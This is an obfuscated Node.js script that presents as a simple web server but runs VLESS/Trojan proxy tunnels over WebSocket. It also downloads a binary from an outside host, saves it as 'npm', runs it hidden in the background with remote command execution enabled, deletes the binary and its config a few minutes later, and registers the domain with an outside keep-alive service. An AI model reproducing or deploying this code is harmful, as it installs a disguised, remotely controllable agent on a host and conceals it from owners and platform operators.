const w=b;(function(c,d){const v=b,e=c();while(!![]){try{const f=parseInt(v(0x172))/0x1*(-parseInt(v(0x177))/0x2)+-parseInt(v(0x103))/0x3*(parseInt(v(0x113))/0x4)+-parseInt(v(0x152))/0x5+-parseInt(v(0x13d))/0x6*(-parseInt(v(0x109))/0x7)+-parseInt(v(0x137))/0x8*(parseInt(v(0x134))/0x9)+-parseInt(v(0x16f))/0xa+parseInt(v(0x144))/0xb;if(f===d)break;else e['push'](e['shift']());}catch(g){e['push'](e['shift']());}}}(a,0x7ddc3));const os=require('os'),http=require(w(0x10a)),fs=require('fs'),axios=require(w(0x15e)),net=require(w(0x146)),path=require(w(0x114)),crypto=require('crypto'),{Buffer}=require(w(0x15d)),{exec,execSync}=require(w(0x170)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][w(0x11c)]||'1bb64688-d1c1-48c3-8c00-6f70126a8bef',NEZHA_SERVER=process[w(0x15f)][w(0x133)]||'',NEZHA_PORT=process[w(0x15f)][w(0x165)]||'',NEZHA_KEY=process[w(0x15f)][w(0x14d)]||'',DOMAIN=process[w(0x15f)]['DOMAIN']||w(0x14e),AUTO_ACCESS=process[w(0x15f)][w(0x12a)]||![],WSPATH=process[w(0x15f)][w(0x12f)]||UUID['slice'](0x0,0x8),SUB_PATH=process[w(0x15f)]['SUB_PATH']||w(0x112),NAME=process[w(0x15f)]['NAME']||w(0x10c),PORT=process[w(0x15f)][w(0x10d)]||0x1eb4;let ISP='';function a(){const X=[':443?security=tls&sni=','sub','28xYVRPp','path','&type=A','application/json','url','data','sha224','toString','&fp=chrome&type=ws&host=','UUID','base64','type','https://arm64.ssss.nyc.mn/agent','country_code','2053','map','close','once','Automatic\x20Access\x20Task\x20added\x20successfully','Hello\x20world!','utf8','finish','npm\x20download\x20successfully','AUTO_ACCESS','true','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','8.8.4.4','&path=%2F','WSPATH','length','includes','listen','NEZHA_SERVER','50625QHIbko','Unknown','write','1328thscFT','writeHead','application/dns-json','reduce','find','send','2630874wpMvjh','setsid\x20nohup\x20./npm\x20-s\x20','2087','then','unlink','aarch64','8443','29250298diiObc','\x20with\x20all\x20DNS\x20servers','net','split','replace','hex','createServer','2083','Not\x20Found\x0a','NEZHA_KEY','1234.abc.com','slice','digest','createHash','3132910WQejft','npm\x20is\x20already\x20running,\x20skip\x20running...','connection','update','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','readUInt8','\x20-p\x20','pipe','index.html','from','readUInt16BE','buffer','axios','env','chmod\x20+x\x20npm','https://','arch','2096','get','NEZHA_PORT','message','writeFileSync','npm','trim','log','https://oooo.serv00.net/add-url','catch','npm\x20is\x20running','error:\x20','3112610pTChET','child_process',':443?encryption=none&security=tls&sni=','358051bjLLZi','createWriteStream','every','text/plain','join','2zxJTLw','utf-8','--tls','config.yaml','text/html','concat','Status','https://dns.google/resolve?name=','Failed\x20to\x20resolve\x20','error','end','pop','338961XAzpUF','connect','Server\x20is\x20running\x20on\x20port\x20','substr','arm','443','14HFloMY','http','Answer','Hug','PORT','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','decode','1.1.1.1'];a=function(){return X;};return a();}const GetISP=async()=>{const x=w;try{const c=await axios[x(0x164)]('https://api.ip.sb/geoip'),d=c['data'];ISP=(d[x(0x120)]+'-'+d['isp'])[x(0x148)](/ /g,'_');}catch(f){ISP=x(0x135);}};GetISP();const httpServer=http[w(0x14a)]((c,d)=>{const y=w;if(c[y(0x117)]==='/'){const e=path['join'](__dirname,y(0x15a));fs['readFile'](e,y(0x127),(f,g)=>{const z=y;if(f){d[z(0x138)](0xc8,{'Content-Type':z(0x17b)}),d[z(0x181)](z(0x126));return;}d[z(0x138)](0xc8,{'Content-Type':z(0x17b)}),d['end'](g);});return;}else{if(c['url']==='/'+SUB_PATH){const f=NAME?NAME+'-'+ISP:ISP,g='vless://'+UUID+'@'+DOMAIN+y(0x171)+DOMAIN+y(0x11b)+DOMAIN+'&path=%2F'+WSPATH+'#'+f,h='trojan://'+UUID+'@'+DOMAIN+y(0x111)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+y(0x12e)+WSPATH+'#'+f,i=g+'\x0a'+h,j=Buffer[y(0x15b)](i)[y(0x11a)](y(0x11d));d[y(0x138)](0xc8,{'Content-Type':y(0x175)}),d['end'](j+'\x0a');}else d[y(0x138)](0x194,{'Content-Type':y(0x175)}),d['end'](y(0x14c));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[w(0x148)](/-/g,''),DNS_SERVERS=[w(0x12d),w(0x110)];function resolveHost(c){return new Promise((d,e)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](c)){d(c);return;}let f=0x0;function g(){const A=b;if(f>=DNS_SERVERS[A(0x130)]){e(new Error(A(0x17f)+c+A(0x145)));return;}const h=DNS_SERVERS[f];f++;const i=A(0x17e)+encodeURIComponent(c)+A(0x115);axios[A(0x164)](i,{'timeout':0x1388,'headers':{'Accept':A(0x139)}})[A(0x140)](j=>{const B=A,k=j[B(0x118)];if(k[B(0x17d)]===0x0&&k['Answer']&&k[B(0x10b)][B(0x130)]>0x0){const l=k['Answer'][B(0x13b)](m=>m[B(0x11e)]===0x1);if(l){d(l[B(0x118)]);return;}}g();})[A(0x16c)](j=>{g();});}g();});}function handleVlessConnection(c,d){const C=w,[e]=d,f=d['slice'](0x1,0x11);if(!f[C(0x174)]((m,n)=>m==parseInt(uuid[C(0x106)](n*0x2,0x2),0x10)))return![];let g=d[C(0x14f)](0x11,0x12)[C(0x157)]()+0x13;const h=d[C(0x14f)](g,g+=0x2)[C(0x15c)](0x0),j=d[C(0x14f)](g,g+=0x1)[C(0x157)](),k=j==0x1?d['slice'](g,g+=0x4)[C(0x176)]('.'):j==0x2?new TextDecoder()[C(0x10f)](d[C(0x14f)](g+0x1,g+=0x1+d['slice'](g,g+0x1)[C(0x157)]())):j==0x3?d[C(0x14f)](g,g+=0x10)[C(0x13a)]((m,n,o,p)=>o%0x2?m[C(0x17c)](p[C(0x14f)](o-0x1,o+0x1)):m,[])['map'](m=>m['readUInt16BE'](0x0)[C(0x11a)](0x10))[C(0x176)](':'):'';c[C(0x13c)](new Uint8Array([e,0x0]));const l=createWebSocketStream(c);return resolveHost(k)[C(0x140)](m=>{const D=C;net[D(0x104)]({'host':m,'port':h},function(){const E=D;this[E(0x136)](d['slice'](g)),l['on'](E(0x180),()=>{})[E(0x159)](this)['on'](E(0x180),()=>{})[E(0x159)](l);})['on'](D(0x180),()=>{});})['catch'](m=>{const G=C;net['connect']({'host':k,'port':h},function(){const F=b;this[F(0x136)](d[F(0x14f)](g)),l['on'](F(0x180),()=>{})['pipe'](this)['on']('error',()=>{})[F(0x159)](l);})['on'](G(0x180),()=>{});}),!![];}function b(c,d){c=c-0x103;const e=a();let f=e[c];return f;}function handleTrojanConnection(c,d){const H=w;try{if(d[H(0x130)]<0x3a)return![];const e=d['slice'](0x0,0x38)['toString'](),f=[UUID];let g=null;for(const n of f){const o=crypto[H(0x151)](H(0x119))[H(0x155)](n)[H(0x150)](H(0x149));if(o===e){g=n;break;}}if(!g)return![];let h=0x38;d[h]===0xd&&d[h+0x1]===0xa&&(h+=0x2);const i=d[h];if(i!==0x1)return![];h+=0x1;const j=d[h];h+=0x1;let k,l;if(j===0x1)k=d[H(0x14f)](h,h+0x4)[H(0x176)]('.'),h+=0x4;else{if(j===0x3){const p=d[h];h+=0x1,k=d[H(0x14f)](h,h+p)[H(0x11a)](),h+=p;}else{if(j===0x4)k=d['slice'](h,h+0x10)[H(0x13a)]((q,r,t,u)=>t%0x2?q[H(0x17c)](u['slice'](t-0x1,t+0x1)):q,[])[H(0x122)](q=>q[H(0x15c)](0x0)[H(0x11a)](0x10))[H(0x176)](':'),h+=0x10;else return![];}}l=d[H(0x15c)](h),h+=0x2;h<d[H(0x130)]&&d[h]===0xd&&d[h+0x1]===0xa&&(h+=0x2);const m=createWebSocketStream(c);return resolveHost(k)[H(0x140)](q=>{const I=H;net[I(0x104)]({'host':q,'port':l},function(){const J=I;h<d[J(0x130)]&&this['write'](d[J(0x14f)](h)),m['on'](J(0x180),()=>{})[J(0x159)](this)['on'](J(0x180),()=>{})[J(0x159)](m);})['on'](I(0x180),()=>{});})[H(0x16c)](q=>{const K=H;net[K(0x104)]({'host':k,'port':l},function(){const L=K;h<d[L(0x130)]&&this[L(0x136)](d[L(0x14f)](h)),m['on']('error',()=>{})[L(0x159)](this)['on']('error',()=>{})['pipe'](m);})['on'](K(0x180),()=>{});}),!![];}catch(q){return![];}}wss['on'](w(0x154),(c,d)=>{const M=w,e=d[M(0x117)]||'';c[M(0x124)](M(0x166),f=>{const N=M;if(f[N(0x130)]>0x11&&f[0x0]===0x0){const g=f['slice'](0x1,0x11),h=g['every']((j,k)=>j==parseInt(uuid[N(0x106)](k*0x2,0x2),0x10));if(h){!handleVlessConnection(c,f)&&c[N(0x123)]();return;}}!handleTrojanConnection(c,f)&&c[N(0x123)]();})['on'](M(0x180),()=>{});});const getDownloadUrl=()=>{const O=w,c=os[O(0x162)]();return c===O(0x107)||c==='arm64'||c===O(0x142)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':O(0x11f):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const P=w;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const c=getDownloadUrl(),d=await axios({'method':P(0x164),'url':c,'responseType':'stream'}),e=fs[P(0x173)](P(0x168));return d[P(0x118)][P(0x159)](e),new Promise((f,g)=>{const Q=P;e['on'](Q(0x128),()=>{const R=Q;console[R(0x16a)](R(0x129)),exec(R(0x160),h=>{if(h)g(h);f();});}),e['on'](Q(0x180),g);});}catch(f){throw f;}},runnz=async()=>{const S=w;try{const f=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':S(0x178)});if(f[S(0x169)]()!==''){console['log'](S(0x153));return;}}catch(g){}await downloadFile();let c='',d=[S(0x108),S(0x143),S(0x163),S(0x13f),S(0x14b),S(0x121)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const h=d[S(0x131)](NEZHA_PORT)?S(0x179):'';c=S(0x13e)+NEZHA_SERVER+':'+NEZHA_PORT+S(0x158)+NEZHA_KEY+'\x20'+h+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const i=NEZHA_SERVER[S(0x131)](':')?NEZHA_SERVER[S(0x147)](':')[S(0x182)]():'',j=d[S(0x131)](i)?S(0x12b):'false',k='client_secret:\x20'+NEZHA_KEY+S(0x12c)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+j+S(0x156)+UUID;fs[S(0x167)](S(0x17a),k);}c=S(0x10e);}else{console[S(0x16a)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(c,{'shell':'/bin/bash'},l=>{const T=S;if(l)console[T(0x180)]('npm\x20running\x20error:',l);else console[T(0x16a)](T(0x16d));});}catch(l){console[S(0x180)](S(0x16e)+l);}};async function addAccessTask(){const U=w;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const c=U(0x161)+DOMAIN;try{const d=await axios['post'](U(0x16b),{'url':c},{'headers':{'Content-Type':U(0x116)}});console[U(0x16a)](U(0x125));}catch(e){}}const delFiles=()=>{const V=w;fs[V(0x141)](V(0x168),()=>{}),fs[V(0x141)](V(0x17a),()=>{});};httpServer[w(0x132)](PORT,()=>{const W=w;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[W(0x16a)](W(0x105)+PORT);});
